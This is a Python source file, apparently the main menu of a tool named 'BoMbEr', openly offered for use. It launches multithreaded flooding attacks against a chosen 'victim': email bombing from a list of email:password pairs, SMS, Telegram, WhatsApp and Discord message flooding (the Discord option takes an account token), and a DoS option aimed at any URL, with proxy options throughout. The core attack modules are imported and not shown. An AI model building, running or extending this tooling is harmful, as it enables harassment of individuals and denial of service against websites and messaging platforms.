# -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#--------------------------------------(main)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import fnmatch
import smtplib
import os.path
import asyncio
import platform
import requests
import colorama
import datetime
import threading
import user_agent
import progressbar
#======================#
sys.path.append('Core')
#======================#
from sms import sms
from dos1 import dos
from time import sleep
from threading import *
from email1 import email
from sys import platform
from telega import telega
from asyncio import sleep
from getpass import getpass
from os import name, system
from discord1 import discord
from progress.bar import Bar
from threading import Thread
from functools import reduce
from whatsapp import whatsapp
from bs4 import BeautifulSoup
from requests import get, post
from selenium import webdriver
from os.path import exists, isfile
from random import choice, randint
from bs4 import BeautifulSoup as bs
from selenium_stealth import stealth
from progress.spinner import Spinner
from selenium.webdriver.common.by import By
from colorama import Fore, Back, Style, init
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException

colorama.init()

if platform == 'win32':
	os.system("cls")

else:
	os.system("clear")

def pb():              
	spinner = Spinner(Fore.YELLOW + Style.BRIGHT + 'Processing ', max=20)
	for i in range(20):
		time.sleep(.12)
		spinner.next()
	spinner.finish()

def check_internet():
	try:
		pb()
		get("http://google.com", timeout=1)
		print("\033[32m{}" .format('''
		╔════════╗
		║Success!║
		╚════════╝'''))

	except Exception:
		print("\033[31m{}" .format('''
		╔═══════════════════════╗
		║No internet connection!║
		╚═══════════════════════╝
					'''))
		input()
		ex()

def ex():
	param=input('Exit? yes/no: ')
	if param == 'yes':
		if platform == 'win32':
			os.system("cls")

		else:
			os.system("clear")
		print("\033[36m{}" .format('''
																		 
                       Thanks for using BoMbEr!
       I would be grateful if you star on this repository on GitHub:
                    https://github.com/ebankoff/BoMbEr

          You can support me by sending any amount to my Qiwi:
                         qiwi.com/n/HERAMANT


                    Copyright (C) 2021 ebankoff                                                                            
			'''))
		print("Press Enter to exit")
		input()
		os.abort()
	elif param == 'no':
		main()

	else:
		print('ERROR: invalid value')
		ex()

def main():
	if platform == 'win32':
		os.system("cls")
	else:
		os.system("clear")

	print(Fore.YELLOW + Style.BRIGHT + '''┏━━┓   ┏━┓┏━┳┓ ┏━━━┓
┃┏┓┃   ┃ ┗┛ ┃┃ ┃┏━━┛
┃┗┛┗┳━━┫┏┓┏┓┃┗━┫┗━━┳━┓
┃┏━┓┃┏┓┃┃┃┃┃┃┏┓┃┏━━┫┏┛
┃┗━┛┃┗┛┃┃┃┃┃┃┗┛┃┗━━┫┃
┗━━━┻━━┻┛┗┛┗┻━━┻━━━┻┛
		''')
	print("\033[0m" + Fore.CYAN + "================================================")
	print(Fore.YELLOW + "Created by Eban'ko - https://github.com/ebankoff")
	print(Fore.YELLOW + f"OS: {platform}")
	print(Fore.CYAN + "================================================")

	print('''
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m0\033[0m\033[40m\033[35m]\033[31m Exit
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m1\033[0m\033[40m\033[35m]\033[33m Email bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m2\033[0m\033[40m\033[35m]\033[33m SMS bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m3\033[0m\033[40m\033[35m]\033[33m Telegram bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m4\033[0m\033[40m\033[35m]\033[33m DoS bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m5\033[0m\033[40m\033[35m]\033[33m WhatsApp bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m6\033[0m\033[40m\033[35m]\033[33m Discord bomber
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m7\033[0m\033[40m\033[35m]\033[36m Clear program cache
\033[0m\033[40m\033[35m[\033[0m\033[40m\033[32m8\033[0m\033[40m\033[35m]\033[31m ♥ \033[36mDonate \033[31m♥
	''')

	try:
		ans = input('\033[0m\033[40m\033[35m → \033[36m')

		if ans == '0':
			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")
			ex()

		elif ans == '1':
			if platform == 'win32':
				os.system("cls")

			else:
				os.system("clear")
			print(Fore.YELLOW + Style.BRIGHT +'''
┏━━━┓      ┏┓
┃┏━━┛      ┃┃
┃┗━━┳┓┏┳━━┳┫┃
┃┏━━┫┗┛┃┏┓┣┫┃
┃┗━━┫┃┃┃┏┓┃┃┗┓
┗━━━┻┻┻┻┛┗┻┻━┛
			''')
			emails = []
			passwords = []
			to = str(input(Fore.YELLOW + Style.BRIGHT +'Enter target email:\033[36m '))
			amount = int(input(Fore.YELLOW + Style.BRIGHT +'How many send from every address:\033[36m '))
			subj = str(input(Fore.YELLOW + Style.BRIGHT +'Enter subject:\033[36m '))
			mes = str(input(Fore.YELLOW + Style.BRIGHT +'Enter message:\033[36m '))
			server = input(Fore.YELLOW + Style.BRIGHT +'Select emails server - 1:Gmail 2:Yahoo 3:Outlook 4:Yandex:\033[36m ')
			ans4 = ""
			ans5 = ""
			with open(r"emails.txt", "r", encoding="utf-8") as file:
				for line in file:
					pos = line.find(':')
					ans4 += line[:pos]
					emails.append(ans4)
					ans4 = ""

			with open(r"emails.txt", "r", encoding="utf-8") as file:
				for line in file:
					pos = line.find(':')
					ans5 += line[pos + 1:]
					passwords.append(ans5)
					ans5 = ""

			emails = [line.rstrip() for line in emails]
			passwords = [line.rstrip() for line in passwords]

			for i in range(len(emails)):
				th = Thread(target=email, args=(emails[i], passwords[i], to, amount, subj, mes, server,))
				th.start()

			print(Fore.GREEN + "Attacking...")
			th.join()

			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '2':
			if platform == 'win32':
				os.system("cls")
			else:
				os.system("clear")

			print(Fore.YELLOW + Style.BRIGHT +'''
┏━━━┳━┓┏━┳━━━┓
┃┏━┓┃ ┗┛ ┃┏━┓┃
┃┗━━┫┏┓┏┓┃┗━━┓
┗━━┓┃┃┃┃┃┣━━┓┃
┃┗━┛┃┃┃┃┃┃┗━┛┃
┗━━━┻┛┗┛┗┻━━━┛
			''')
			ans = input(Fore.YELLOW + Style.BRIGHT + 'Attack one phone(1) or more(2)? 1/2:\033[36m ')
			if ans == '1':
				prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no:\033[36m ").lower()
				code = input(Fore.YELLOW + Style.BRIGHT + "Target country code: \033[36m+")
				number = code + input(Fore.YELLOW + Style.BRIGHT + f"Target number: \033[36m{code}")
				tm = int(input(Fore.YELLOW + Style.BRIGHT + "Time attack(in seconds):\033[36m "))
				thr = int(input(Fore.YELLOW + Style.BRIGHT + "Number of threads:\033[36m "))
				for i in range(thr):
					th = Thread(target=sms, args=(prx, number, tm, code,))
					th.start()
					print(f"\033[35m[\033[36m{str(i + 1)}\033[35m]" + Fore.CYAN + " thread started")

				print(Fore.GREEN + "\nAttacking...")
				time.sleep(tm+10)

				print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
				''')

			elif ans == '2':
				numbers = []
				with open("numbers.txt", "r", encoding="utf-8") as file:
					for line in file:
						numbers.append(line)
				numbers = [line.rstrip() for line in numbers]
				print(f'Found {len(numbers)} numbers')
				prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no:\033[36m ").lower()
				tm = int(input(Fore.YELLOW + Style.BRIGHT + "Time attack(in seconds):\033[36m "))
				thr = int(input(Fore.YELLOW + Style.BRIGHT + "Number of threads:\033[36m "))
				for y in range(len(numbers)):
					for i in range(thr):
						th = Thread(target=sms, args=(prx, number, tm, code,))
						th.start()
						print(f"\033[35m[\033[36m{str(i + 1)}\033[35m]" + Fore.CYAN + f" thread for the number {numbers[y]} is running")

				print(Fore.GREEN + "\nAttacking...")
				time.sleep(tm+10)

				print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
				''')

			else:
				print(Fore.RED + '\nERROR!')

			ex()

		elif ans == '3':
			if platform == 'win32':
				os.system("cls")
			else:
				os.system("clear")

			print(Fore.YELLOW + Style.BRIGHT +'''
┏━━━━┓ ┏┓
┃┏┓┏┓┃ ┃┃
┗┛┃┃┣┻━┫┃┏━━┳━━┳━┳━━┳┓┏┓
  ┃┃┃ ━┫┃┃ ━┫┏┓┃┏┫┏┓┃┗┛┃
  ┃┃┃ ━┫┗┫ ━┫┗┛┃┃┃┏┓┃┃┃┃
  ┗┛┗━━┻━┻━━┻━┓┣┛┗┛┗┻┻┻┛
            ┏━┛┃
            ┗━━┛
			''')
			
			name = input(Fore.YELLOW + Style.BRIGHT + "Victim name:\033[36m ")
			count = int(input(Fore.YELLOW + Style.BRIGHT + "Number of messages:\033[36m "))
			msg = input(Fore.YELLOW + Style.BRIGHT + "Message:\033[36m ")
			cn = 0
			print("")
			print(Fore.YELLOW + Style.BRIGHT + "YOU HAVE 35 SECONDS TO LOG IN!")
			input(Fore.YELLOW + Style.BRIGHT + "Press Enter to start")
			telega(name, count, msg, cn)
			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '4':
			if platform == 'win32':
				os.system("cls")
			else:
				os.system("clear")

			print(Fore.YELLOW + Style.BRIGHT + '''
┏━━━┓  ┏━━━┓
┗┓┏┓┃  ┃┏━┓┃
 ┃┃┃┣━━┫┗━━┓
 ┃┃┃┃┏┓┣━━┓┃
┏┛┗┛┃┗┛┃┗━┛┃
┗━━━┻━━┻━━━┛
				''')
			prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no:\033[36m ").lower()
			url = input(Fore.YELLOW + Style.BRIGHT + "URL:\033[36m ")
			tm = int(input(Fore.YELLOW + Style.BRIGHT + "Attack time in seconds:\033[36m "))
			threads = int(input(Fore.YELLOW + Style.BRIGHT + "Threads:\033[36m "))

			for i in range(threads):
				th = threading.Thread(target=dos, args=(url, tm, prx,))
				th.start()
				print(f"\033[35m[\033[36m{str(i + 1)}\033[35m]" + Fore.CYAN + " thread started")

			th.join()
			time.sleep(4)

			if platform == 'win32':
				os.system("cls")
			else:
				os.system("clear")

			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '5':
			if platform == 'win32':
				os.system("cls")
			else:
				os.system("clear")

			print(Fore.YELLOW + Style.BRIGHT +'''
┏┓┏┓┏┳┓    ┏┓   ┏━━━┓
┃┃┃┃┃┃┃   ┏┛┗┓  ┃┏━┓┃
┃┃┃┃┃┃┗━┳━┻┓┏╋━━┫┃ ┃┣━━┳━━┓
┃┗┛┗┛┃┏┓┃┏┓┃┃┃━━┫┗━┛┃┏┓┃┏┓┃
┗┓┏┓┏┫┃┃┃┏┓┃┗╋━━┃┏━┓┃┗┛┃┗┛┃
 ┗┛┗┛┗┛┗┻┛┗┻━┻━━┻┛ ┗┫┏━┫┏━┛
                    ┃┃ ┃┃
                    ┗┛ ┗┛
			''')
			name = input(Fore.YELLOW + Style.BRIGHT + "Victim name:\033[36m ")
			count = int(input(Fore.YELLOW + Style.BRIGHT + "Number of messages:\033[36m "))
			msg = input(Fore.YELLOW + Style.BRIGHT + "Message:\033[36m ")
			cn=0

			print("")
			print(Fore.YELLOW + Style.BRIGHT + "YOU HAVE 15 SECONDS TO LOG IN!")
			input(Fore.YELLOW + Style.BRIGHT + "Press Enter to start")
			whatsapp(name, count, msg, cn)
			print("")
			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '6':
			if platform == 'win32':
				os.system("cls")
			else:
				os.system("clear")

			print(Fore.YELLOW + Style.BRIGHT +'''
┏━━━┓             ┏┓
┗┓┏┓┃             ┃┃
 ┃┃┃┣┳━━┳━━┳━━┳━┳━┛┃
 ┃┃┃┣┫━━┫┏━┫┏┓┃┏┫┏┓┃
┏┛┗┛┃┣━━┃┗━┫┗┛┃┃┃┗┛┃
┗━━━┻┻━━┻━━┻━━┻┛┗━━┛
			''')
			prx = input(Fore.YELLOW + Style.BRIGHT + "Proxy? yes/no:\033[36m ").lower()
			idd = input(Fore.YELLOW + Style.BRIGHT + "Target ID:\033[36m ")
			tkn = input(Fore.YELLOW + Style.BRIGHT + "Account token:\033[36m ")
			cnt = int(input(Fore.YELLOW + Style.BRIGHT + "Number of messages:\033[36m "))
			msg = input(Fore.YELLOW + Style.BRIGHT + "Message:\033[36m ")
			print("")
			input(Fore.YELLOW + Style.BRIGHT + "Press Enter to start")
			discord(tkn, idd, msg, cnt, prx)
			print("")
			print(Fore.GREEN + '''
===============================
            SUCCESS
===============================
			''')
			ex()

		elif ans == '7':
			try:
				shutil.rmtree('Core/__pycache__')
				print("SUCCESS!")
			except:
				print('The program cache is already empty')
			ex()

		elif ans == '8':
			if platform == 'win32':
				os.system("cls")
			else:
				os.system("clear")
			print(Fore.YELLOW + "===========================================================")
			print(Fore.CYAN + """Payeer: P1063409412
Qiwi: https://qiwi.com/n/HERAMANT
Smart chain: 0x96a0B6E4274771D5f3F8e59564b58C35D74D8Cc1
Bitcoin: bc1qxfvstf99kyuc5x5uugxtsh3m6w3a73ruzfav7e
Ethereum: 0x96a0B6E4274771D5f3F8e59564b58C35D74D8Cc1""")
			print(Fore.YELLOW + "===========================================================\n")
			ex()

		else:
			print(Fore.RED + '\nERROR!')
			ex()

	except:
		print(Fore.RED + '\nERROR!')
		ex()

if __name__=='__main__':
	if platform == 'win32':
		ctypes.windll.kernel32.SetConsoleTitleW("BoMbEr")
	pb()
	main()